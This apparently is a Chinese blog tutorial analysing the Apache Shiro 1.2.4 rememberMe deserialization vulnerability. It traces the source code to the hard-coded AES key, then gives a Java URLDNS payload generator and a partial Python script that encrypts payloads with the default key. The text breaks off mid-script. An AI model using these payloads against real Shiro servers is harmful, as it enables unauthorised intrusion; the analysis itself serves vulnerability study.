        <content type="html"><![CDATA[<span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>JDK：1.7<br>Tomcat：8.5.83<br> shiro源码：下载地址：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a><br>shiro war包：下载地址<a href="https://github.com/jas502n/SHIRO-550/blob/master/samples-web-1.2.4.war">https://github.com/jas502n/SHIRO-550/blob/master/samples-web-1.2.4.war</a></p><p>先看这两个文章：<br><a href="https://www.cnblogs.com/nice0e3/p/14183173.html#:~:text=%E6%9C%AC%E6%96%87%E5%AF%B9%E8%AF%A5Shiro550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%AA%E5%88%86%E6%9E%90%EF%BC%8C%E4%BA%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E3%80%82%200x01%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%20Shiro,550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E7%89%88%E6%9C%AC%EF%BC%9Ashiro%20%3C1.2.4%EF%BC%8C%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%E6%98%AF%E5%9B%A0%E4%B8%BAshiro%E6%8E%A5%E5%8F%97%E4%BA%86Cookie%E9%87%8C%E9%9D%A2%20rememberMe%20%E7%9A%84%E5%80%BC%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8E%BB%E8%BF%9B%E8%A1%8CBase64%E8%A7%A3%E5%AF%86%E5%90%8E%EF%BC%8C%E5%86%8D%E4%BD%BF%E7%94%A8aes%E5%AF%86%E9%92%A5%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%82">https://www.cnblogs.com/nice0e3/p/14183173.html</a><br><a href="https://blog.csdn.net/m0_67401270/article/details/126721347">https://blog.csdn.net/m0_67401270&#x2F;article&#x2F;details&#x2F;126721347</a></p><pre class=" language-txt"><code class="language-txt">坑点：1.pom.xml包报错其实不用理他我想要解决这个报错半条解决不掉，结果浪费了好多时间2.启动Tomcat的时候要导入的war包用我们刚才下载的那个就可以</code></pre><p>然后启动成功的界面就是这样的：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p><h2 id="简单了解流程"><a href="#简单了解流程" class="headerlink" title="简单了解流程"></a>简单了解流程</h2><p>登陆的时候记得按Remember Me<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"><br>首先我们抓一个登陆的包：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"><br>可以注意到里面有一个rememberMe，思考一下这个rememberMe的内容是什么。<br>我们回到源码里面去分析，直接搜索cookie：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"><br>发现有一个<code>CookieRememerMeManager</code>这个类，看名字就知道他多半就是处理<code>RememberMe</code>的逻辑，进去看看：<br>先看他的结构：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"><br>有两个方法我我们注意一下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">rememberSerializedIdentity</span><span class="token punctuation">(</span>Subject subject<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>WebUtils<span class="token punctuation">.</span><span class="token function">isHttp</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                String msg <span class="token operator">=</span> <span class="token string">"Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet "</span> <span class="token operator">+</span>                        <span class="token string">"request and response in order to set the rememberMe cookie. Returning immediately and "</span> <span class="token operator">+</span>                        <span class="token string">"ignoring rememberMe operation."</span><span class="token punctuation">;</span>                log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        HttpServletRequest request <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getHttpRequest</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>        HttpServletResponse response <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getHttpResponse</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//base 64 encode it and store as a cookie:</span>        String base64 <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>        Cookie template <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//the class attribute is really a template for the outgoing cookies</span>        Cookie cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleCookie</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span>        cookie<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>        cookie<span class="token punctuation">.</span><span class="token function">saveTo</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRememberedSerializedIdentity</span><span class="token punctuation">(</span>SubjectContext subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>WebUtils<span class="token punctuation">.</span><span class="token function">isHttp</span><span class="token punctuation">(</span>subjectContext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                String msg <span class="token operator">=</span> <span class="token string">"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a "</span> <span class="token operator">+</span>                        <span class="token string">"servlet request and response in order to retrieve the rememberMe cookie. Returning "</span> <span class="token operator">+</span>                        <span class="token string">"immediately and ignoring rememberMe operation."</span><span class="token punctuation">;</span>                log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        WebSubjectContext wsc <span class="token operator">=</span> <span class="token punctuation">(</span>WebSubjectContext<span class="token punctuation">)</span> subjectContext<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isIdentityRemoved</span><span class="token punctuation">(</span>wsc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        HttpServletRequest request <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getHttpRequest</span><span class="token punctuation">(</span>wsc<span class="token punctuation">)</span><span class="token punctuation">;</span>        HttpServletResponse response <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getHttpResponse</span><span class="token punctuation">(</span>wsc<span class="token punctuation">)</span><span class="token punctuation">;</span>        String base64 <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Browsers do not always remove cookies immediately (SHIRO-183)</span>        <span class="token comment" spellcheck="true">// ignore cookies that are scheduled for removal</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Cookie<span class="token punctuation">.</span>DELETED_COOKIE_VALUE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>base64 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            base64 <span class="token operator">=</span> <span class="token function">ensurePadding</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Acquired Base64 encoded identity ["</span> <span class="token operator">+</span> base64 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decoded <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Base64 decoded byte array length: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>decoded <span class="token operator">!=</span> null <span class="token operator">?</span> decoded<span class="token punctuation">.</span>length <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" bytes."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> decoded<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//no cookie set - new site visitor?</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>我们查找哪里调用了<code>getRememberedSerializedIdentity</code>：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"><br>有一个叫<code>getRememberedPrincipals</code>的方法调用<code>getRememberedSerializedIdentity</code>。看名字就知道<code>getRememberedPrincipals</code>是一个取得Remember验证的方法：</p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> PrincipalCollection <span class="token function">getRememberedPrincipals</span><span class="token punctuation">(</span>SubjectContext subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        PrincipalCollection principals <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">getRememberedSerializedIdentity</span><span class="token punctuation">(</span>subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> bytes<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 跟进 convertBytesToPrincipals()</span>                principals <span class="token operator">=</span> <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> re<span class="token punctuation">)</span> <span class="token punctuation">{</span>            principals <span class="token operator">=</span> <span class="token function">onRememberedPrincipalFailure</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> principals<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>这里我们再跟进<code>convertBytesToPrincipals()</code>,因为<code>convertBytesToPrincipals()</code>就是处理<code>getRememberedSerializedIdentity()</code> 的东西，看名字也猜到就是进行字节转换的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> PrincipalCollection <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> SubjectContext subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bytes <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>这个类就做了两件事情：</p><ul><li>解码</li><li>反序列化</li></ul><p>我们可以先看反序列化：<br>一路跟进到deserialize：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> T <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token keyword">throws</span> SerializationException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>serialized <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String msg <span class="token operator">=</span> <span class="token string">"argument cannot be null."</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        ByteArrayInputStream bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>        BufferedInputStream bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassResolvingObjectInputStream</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"unchecked"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>            T deserialized <span class="token operator">=</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> deserialized<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String msg <span class="token operator">=</span> <span class="token string">"Unable to deserialze argument byte array."</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SerializationException</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>发现有一个反序列化入口<code>readObject()</code>这里就是我们想要利用的点</p><p>那我们回头看解码那个地方他的逻辑是如何的：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> encrypted<span class="token punctuation">;</span>        CipherService cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            serialized <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> serialized<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>可以看到最关键的就是<code>ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</code>这一句了<br>先看decrypt是什么：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"><br>接口的抽象方法，有两个参数<br>第一个是要解密的数据<br>第二个参数就是解密的key了，这个是我们十分关心的，所以我们跟进第二个参数<code>getDecryptionCipherKey()</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> decryptionCipherKey<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>返回<code>decryptionCipherKey</code>那我们就看这个是什么</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionCipherKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>decryptionCipherKey <span class="token operator">=</span> decryptionCipherKey<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>发现<code>setDecryptionCipherKey()</code>方法调用了，接着看哪里调用了<code>setDecryptionCipherKey()</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cipherKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//Since this method should only be used in symmetric ciphers</span>        <span class="token comment" spellcheck="true">//(where the enc and dec keys are the same), set it on both:</span>        <span class="token function">setEncryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>看<code>setCipherKey()</code>在哪里被调用了：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">AbstractRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setCipherKey</span><span class="token punctuation">(</span>DEFAULT_CIPHER_KEY_BYTES<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>我们跟进<code>DEFAULT_CIPHER_KEY_BYTES</code>，发现<code>DEFAULT_CIPHER_KEY_BYTES</code>确实是个常量：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"><br>那就意味着这里是一个固定key加密，我们可以伪造反序列化数据从而达到攻击的目的。</p><h2 id="URLDNS链攻击："><a href="#URLDNS链攻击：" class="headerlink" title="URLDNS链攻击："></a>URLDNS链攻击：</h2><p>DNS生成序列化文件：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> packet1<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLNDS</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>URL<span class="token punctuation">,</span> Integer<span class="token operator">></span> hashmap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>URL<span class="token punctuation">,</span> Integer<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://09f42989.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">URL</span><span class="token operator">></span> clazz <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashmap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>利用脚本生成payload：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> base64<span class="token keyword">import</span> uuid<span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">def</span> <span class="token function">get_file_data</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">aes_enc</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> chr<span class="token punctuation">(</span>BS <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bytes    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ciphertext<span class="token keyword">def</span> <span class="token function">aes_dec</span><span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    enc_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span>    unpad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token 